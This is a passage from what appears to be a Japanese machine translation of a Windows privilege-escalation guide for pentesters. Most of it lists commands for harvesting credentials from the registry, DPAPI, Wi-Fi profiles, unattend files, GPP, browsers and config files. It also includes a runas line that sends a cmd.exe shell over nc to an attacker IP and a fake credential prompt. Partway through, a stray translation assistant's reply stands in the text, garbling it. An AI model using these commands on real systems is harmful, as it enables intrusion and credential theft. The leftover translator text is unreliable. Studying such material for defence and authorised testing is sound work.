- 特権操作では呼び出し元のコンテキストを検証する。プロセス終了やハンドル返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs を制限する（access masks、METHOD_*, 入力検証）し、直接的なカーネル権限の代わりに brokered models を検討する。

防御者向けの検出アイデア
- 疑わしいデバイス名（例: \\ .\\amsdk*）のユーザーモードでのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、自前の allow/deny リストを維持する。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、次を参照してください:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**restricted services**が開放されていないか確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(ルール一覧、ルール作成、無効化、無効化...)**

さらに[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると任意のポートで待ち受けできます（最初に `nc.exe` でポートを待ち受けするとき、GUI を通じて `nc` を firewall に許可するかどうか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単に root として `bash` を起動するには、`--default-user root` を試してください

フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で `WSL` ファイルシステムを参照できます

## Windows 認証情報

### Winlogon 認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャ / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、サーバー、ウェブサイト、その他のプログラム用のユーザー資格情報を保存します。これらは **Windows** が **自動的にユーザーをログインさせる**y。最初は、ユーザーが Facebook、Twitter、Gmail などの資格情報をブラウザに保存して自動ログインするように見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows が自動的にログインに使用できる資格情報を保存します。つまり、任意の **Windows application that needs credentials to access a resource** (サーバーやウェブサイト) が、**can make use of this Credential Manager** & Windows Vault を利用して、ユーザーが毎回ユーザー名やパスワードを入力する代わりに保存された資格情報を使用できる、ということです。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの資格情報を使用することはできないと思います。したがって、アプリケーションが vault を利用したい場合は、デフォルトのストレージ vault からそのリソースの資格情報を取得するために、何らかの方法で **communicate with the credential manager and request the credentials for that resource** する必要があります。

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、`runas` を `/savecred` オプションで使用して保存された資格情報を利用できます。以下の例は SMB 共有経由でリモートのバイナリを呼び出すものです。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報を使って `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意: mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) などから取得できることに注意してください。

### DPAPI

The **Data Protection API (DPAPI)** はデータの対称暗号化の手段を提供し、主にWindowsオペレーティングシステム内で非対称プライベートキーの対称暗号化に使用されます。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPIは、ユーザーのログインシークレットから導出された対称鍵を用いてキーを暗号化することを可能にします**。システム暗号化が関与するシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPIを使用して暗号化されたユーザーのRSAキーは、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。 **ユーザーのプライベートキーを保護するマスターキーと同じファイルに共存するDPAPIキーは**、通常64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMDの `dir` コマンドでは内容を列挙できない点に注意してください。ただしPowerShellでは列挙可能です。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
それを復号するには、適切な引数（`/pvk` または `/rpc`）を指定して **mimikatz module** `dpapi::masterkey` を使用できます。

**マスターパスワードで保護された認証情報ファイル** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
root の場合、`sekurlsa::dpapi` モジュールを使って **extract many DPAPI** **masterkeys** from **memory** できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された資格情報を便利に保存する手段として、**scripting** や自動化タスクでよく使用されます。これらの資格情報は **DPAPI** を使って保護されており、通常は作成されたのと同じコンピューター上の同一ユーザーでしか復号できません。

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

保存済み RDP 接続は `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### Recently Run Commands

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **復号** any .rdg files`\
Mimikatz の `sekurlsa::dpapi` モジュールを使用すると、メモリから**多くの DPAPI masterkeys を抽出**できます

### Sticky Notes

Windows ワークステーション上では、ユーザーが StickyNotes アプリを使って、データベースファイルであることに気づかずに**パスワードを保存**したりその他の情報を保存したりすることがよくあります。  
このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe からパスワードを回復するには Administrator 権限で High Integrity レベルで実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **credentials** が設定されており、**回復**できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください。\
インストーラは **SYSTEM privilegesで実行されます**, 多くは **DLL Sideloading (情報元** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
もしそのパス内にエントリが見つかった場合、それはおそらく保存された SSH キーです。  
それは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\

この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが実行されておらず、起動時に自動的に開始させたい場合は次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもはや有効ではないようです。いくつかのsshキーを作成し、`ssh-add`で追加して、sshでマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmonは非対称鍵認証の間に`dpapi.dll`の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは**metasploit**を使用して検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

名前が **SiteList.xml** のファイルを検索してください。

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを配布する機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして格納される Group Policy Objects (GPOs) は、任意のドメインユーザーがアクセスできました。第二に、これらの GPP 内のパスワードは、公開された既定のキーで AES256 によって暗号化されており、認証された任意のユーザーによって復号できました。これにより、ユーザーが権限昇格を行える可能性があり、重大なリスクを招いていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルのうち "cpassword" フィールドが空でないものをスキャンする関数が開発されました。該当ファイルが見つかると、その関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細やファイルの位置が含まれ、脆弱性の特定と対処に役立ちます。

以下のファイルを、`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista より前）で検索してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS の Web 設定
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を要求する

ユーザーがそれらを知っている可能性があると思う場合は、常に**ユーザーに自身の credentials、あるいは別のユーザーの credentials を入力するよう頼む**ことができます（クライアントに直接**頼む**ことで**credentials**を求めるのは本当に**危険**であることに注意してください）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentialsを含む可能性のあるファイル名**

以前、次のファイルには**passwords**が**clear-text**または**Base64**で含まれていたことがあります
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md. Please paste the file contents (or the parts you want translated), or provide the list of "proposed files" you want searched/translated. I'll then translate the relevant English text to Japanese following your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の資格情報

ごみ箱も確認して、その中に資格情報がないか探してください。

複数のプログラムに保存された**パスワードを回復する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含み得るその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh キーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

パスワードが保存されている **Chrome or Firefox** の db を確認するべきです。\
また、ブラウザの履歴、ブックマーク、favorites（お気に入り）も確認してください。そこに **パスワード** が保存されている可能性があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれたテクノロジーで、異なる言語のソフトウェアコンポーネント間の **intercommunication** を可能にします。各 COM コンポーネントは **identified via a class ID (CLSID)** で識別され、各コンポーネントは1つ以上のインターフェースを通じて機能を公開します。インターフェースは **identified via interface IDs (IIDs)** によって識別されます。

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名やパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインで、被害者内でcredentialsを検索するすべての **metasploit POST module を自動的に実行する** ために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出する別の優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータを平文で保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の **sessions**、**usernames**、および **passwords** を検索します
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **SYSTEMとして動作しているプロセスが新しいプロセスを開く** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメント（**pipes**）はプロセス間の通信とデータ転送を可能にします。

Windowsは**Named Pipes**という機能を提供しており、関連のないプロセス間でも、場合によっては異なるネットワーク上でデータを共有できます。これはクライアント/サーバーのアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

クライアントがパイプを通じてデータを送信すると、そのパイプを設定した**server**は必要な**SeImpersonate**権限があれば、**clientのアイデンティティを引き受ける**ことができます。あなたが模倣できるパイプ経由で通信する**特権プロセス**を特定できれば、そのプロセスがあなたの作成したパイプとやり取りした際にそのアイデンティティを取得することで、**より高い権限を得る**機会が生まれます。このような攻撃を実行する手順については[**here**](named-pipe-client-impersonation.md)および[**here**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールは**burpのようなツールでnamed pipeの通信をインターセプトする**ことを可能にします: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールはprivescsを見つけるためにすべてのパイプを一覧表示して確認することを可能にします** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

ページを確認してください: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

ユーザーとしてシェルを取得した場合、スケジュールされたタスクや他のプロセスが**コマンドライン上で認証情報を渡している**ことがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現在の状態と前回の状態を比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、いくつかの Microsoft Windows のバージョンでは権限のないユーザーから "NT\AUTHORITY SYSTEM" のようなターミナルや他のプロセスを実行することが可能です。

これにより、同じ脆弱性で権限昇格と UAC のバイパスを同時に行うことができます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名および発行されています。

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
